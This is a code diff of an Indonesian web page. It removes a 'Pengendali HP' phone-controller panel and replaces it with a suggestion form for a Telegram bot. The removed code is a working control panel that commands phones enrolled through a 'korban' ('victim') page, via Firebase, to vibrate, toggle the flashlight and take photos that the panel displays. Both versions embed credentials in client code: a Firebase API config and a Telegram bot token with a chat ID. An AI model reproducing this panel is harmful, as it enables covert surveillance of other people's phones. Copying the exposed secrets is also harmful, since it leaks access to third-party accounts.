@@ -1,157 +1,137 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Pengendali — Kontrol HP</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Usulan Menu Bot</title>
   <style>
-    :root{ --bg:#061022; --card:#07162c; --muted:#9fb0bf; --accent:#06b6d4; --accent-2:#7c3aed; font-family:Inter,system-ui,Arial}
-    *{box-sizing:border-box}
-    body{margin:0; min-height:100vh; background:linear-gradient(180deg,var(--bg), #042034); color:#eaf6ff; display:flex; align-items:center; justify-content:center; padding:20px}
-    .panel{width:100%; max-width:920px; border-radius:12px; padding:18px; background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.008)); box-shadow:0 10px 40px rgba(2,6,23,0.6); border:1px solid rgba(255,255,255,0.02)}
-    h1{margin:0 0 6px 0}
-    p.lead{margin:0 0 14px 0; color:var(--muted)}
-    .controls{display:flex; gap:10px; flex-wrap:wrap}
-    button{padding:10px 14px;border-radius:10px;border:0; font-weight:800; cursor:pointer; color:#fff; background:linear-gradient(135deg,var(--accent),var(--accent-2)); box-shadow:0 8px 20px rgba(2,6,23,0.4)}
-    button.secondary{background:transparent; color:var(--accent); border:1px solid rgba(6,182,212,0.12)}
-    .list{margin-top:12px; display:flex; gap:10px; flex-wrap:wrap}
-    .device{padding:10px 12px; border-radius:10px; background:rgba(255,255,255,0.02); min-width:200px; cursor:pointer; border:1px solid rgba(255,255,255,0.02)}
-    .device.online{box-shadow:0 6px 18px rgba(6,182,212,0.06); border:1px solid rgba(6,182,212,0.12)}
-    .meta{color:var(--muted); font-size:13px}
-    img#hasil{max-width:360px;border-radius:8px;margin-top:12px;border:1px solid rgba(255,255,255,0.03)}
-    @media(max-width:720px){ img#hasil{max-width:100%} }
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: rgba(0, 0, 0, 0.6);
+      padding: 25px;
+      border-radius: 15px;
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.5);
+    }
+    h1 {
+      margin-bottom: 10px;
+    }
+    textarea {
+      width: 100%;
+      height: 100px;
+      border-radius: 10px;
+      border: none;
+      padding: 10px;
+      font-size: 14px;
+      resize: none;
+      outline: none;
+    }
+    button {
+      margin-top: 10px;
+      background: #06d6a0;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 10px;
+      font-size: 16px;
+      cursor: pointer;
+      color: white;
+      transition: 0.3s;
+    }
+    button:disabled {
+      background: gray;
+      cursor: not-allowed;
+    }
+    button:hover:enabled {
+      background: #04b383;
+    }
+    #status {
+      margin-top: 15px;
+      font-size: 14px;
+    }
   </style>
 </head>
 <body>
-  <div class="panel">
-    <h1>Pengendali HP</h1>
-    <p class="lead">Pilih device yang terdaftar lalu kirim perintah. Untuk uji di 1 HP: buka korban.html di tab biasa, pengendali di incognito/ browser lain.</p>
+  <div class="container">
+    <h1>💡 Usulan Menu Baru</h1>
+    <p>Kamu punya ide buat bot ini? Kasih usulanmu di bawah 👇</p>
+    
+    <form id="usulanForm">
+      <textarea id="usulan" placeholder="Tulis usulanmu di sini..." required></textarea>
+      <button type="submit" id="kirimBtn">Kirim Usulan</button>
+    </form>
 
-    <div style="display:flex; gap:12px; align-items:center; flex-wrap:wrap">
-      <div>
-        <strong>Device terdeteksi:</strong>
-        <div id="devicesCount">0</div>
-      </div>
-
-      <div style="margin-left:auto">
-        <button id="refreshBtn" class="secondary">Refresh</button>
-      </div>
-    </div>
-
-    <div class="list" id="devicesList" style="margin-top:12px"></div>
-
-    <div style="margin-top:12px">
-      <div class="controls" id="actionButtons" style="display:none">
-        <button onclick="sendCmd('getar')">Getar</button>
-        <button onclick="sendCmd('getar_stop')" class="secondary">Stop Getar</button>
-        <button onclick="sendCmd('senter_on')">Nyalakan Senter</button>
-        <button onclick="sendCmd('senter_off')" class="secondary">Matikan Senter</button>
-        <button onclick="sendCmd('foto')">Ambil Foto</button>
-      </div>
-
-      <div id="selectedInfo" style="margin-top:12px;color:var(--muted)"></div>
-
-      <div>
-        <h3 style="margin-top:14px">Hasil Foto (device pilih)</h3>
-        <img id="hasil" alt="Belum ada foto">
-      </div>
-    </div>
+    <p id="status"></p>
   </div>
 
-  <!-- Firebase v8 -->
-  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-
   <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyDAdpM__XaG1-Q9pcYk1f3S7IUfutshCbs",
-      authDomain: "ghanz-41b28.firebaseapp.com",
-      databaseURL: "https://ghanz-41b28-default-rtdb.firebaseio.com",
-      projectId: "ghanz-41b28",
-      storageBucket: "ghanz-41b28.appspot.com",
-      messagingSenderId: "377852500388",
-      appId: "1:377852500388:web:c8022af22a181979ee8931",
-      measurementId: "G-6P7WSEWLP7"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+    let cooldown = false;
+    const cooldownTime = 30; // detik
+    const btn = document.getElementById("kirimBtn");
+    const status = document.getElementById("status");
 
-    const devicesList = document.getElementById('devicesList');
-    const devicesCount = document.getElementById('devicesCount');
-    const refreshBtn = document.getElementById('refreshBtn');
-    const actionButtons = document.getElementById('actionButtons');
-    const selectedInfo = document.getElementById('selectedInfo');
-    const hasilImg = document.getElementById('hasil');
+    document.getElementById("usulanForm").addEventListener("submit", function(e) {
+      e.preventDefault();
 
-    let selectedDevice = null;
+      if (cooldown) {
+        status.innerText = "⏳ Tunggu dulu sebelum kirim lagi!";
+        return;
+      }
 
-    // listen clients list
-    const clientsRef = db.ref('clients');
-    clientsRef.on('value', snap => {
-      const val = snap.val() || {};
-      renderDevices(val);
-    });
+      const usulan = document.getElementById("usulan").value;
 
-    function renderDevices(all) {
-      devicesList.innerHTML = '';
-      const keys = Object.keys(all || {});
-      devicesCount.textContent = keys.length;
-      keys.forEach(k => {
-        const node = all[k];
-        const status = node.status || {};
-        const meta = node.meta || {};
-        const isOnline = status.online === true;
-        const lastSeen = status.lastSeen || meta.lastSeen || 0;
-        const lastSeenText = lastSeen ? new Date(lastSeen).toLocaleString() : '—';
-        const div = document.createElement('div');
-        div.className = 'device' + (isOnline ? ' online' : '');
-        div.innerHTML = '<div style="font-weight:700">'+k+'</div><div class="meta">'+ (meta.platform ? meta.platform.split(' ')[0] : '') +'<br>lastSeen: '+ lastSeenText +'</div>';
-        div.onclick = ()=> selectDevice(k);
-        devicesList.appendChild(div);
-      });
-    }
+      // Token & Chat ID kamu
+      const BOT_TOKEN = "8122149065:AAFVOUdMfbdwwyOvJQLkypO0cRb3R9VrNx4";
+      const CHAT_ID = "7882058841";
 
-    function selectDevice(deviceId) {
-      selectedDevice = deviceId;
-      selectedInfo.textContent = 'Terpilih: ' + deviceId;
-      actionButtons.style.display = 'flex';
-      // listen foto and lastCmd for this device
-      db.ref('clients/' + deviceId + '/foto').off();
-      db.ref('clients/' + deviceId + '/lastCmd').off();
+      const text = `📩 Usulan baru dari buyer:\n\n${usulan}`;
 
-      db.ref('clients/' + deviceId + '/foto').on('value', snap => {
-        const data = snap.val();
-        if (data) hasilImg.src = data;
-        else hasilImg.removeAttribute('src');
-      });
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text,
+        }),
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.ok) {
+          status.innerText = "✅ Usulan berhasil dikirim!";
+          document.getElementById("usulan").value = "";
 
-      db.ref('clients/' + deviceId + '/lastCmd').on('value', snap => {
-        const d = snap.val();
-        if (d && d.cmd) {
-          // optionally show somewhere
-          console.log('lastCmd', d);
+          // Aktifkan cooldown
+          cooldown = true;
+          btn.disabled = true;
+          let sisa = cooldownTime;
+          const interval = setInterval(() => {
+            btn.innerText = `Tunggu ${sisa}s`;
+            sisa--;
+            if (sisa < 0) {
+              clearInterval(interval);
+              cooldown = false;
+              btn.disabled = false;
+              btn.innerText = "Kirim Usulan";
+              status.innerText = "";
+            }
+          }, 1000);
+        } else {
+          status.innerText = "❌ Gagal mengirim, coba lagi.";
         }
+      })
+      .catch(() => {
+        status.innerText = "⚠️ Error koneksi!";
       });
-    }
-
-    function sendCmd(cmd) {
-      if (!selectedDevice) { alert('Pilih device dulu.'); return; }
-      // write command to device's cmd node (do not remove other nodes)
-      db.ref('clients/' + selectedDevice + '/cmd').set(cmd, err => {
-        if (err) alert('Gagal kirim: ' + err);
-        else console.log('Dikirim', cmd);
-      });
-    }
-
-    // manual refresh (extra)
-    refreshBtn.addEventListener('click', () => {
-      clientsRef.once('value').then(snap => renderDevices(snap.val() || {}));
-    });
-
-    // connection indicator (optional)
-    db.ref('.info/connected').on('value', snap => {
-      const ok = !!snap.val();
-      console.log('connected', ok);
     });
   </script>
 </body>
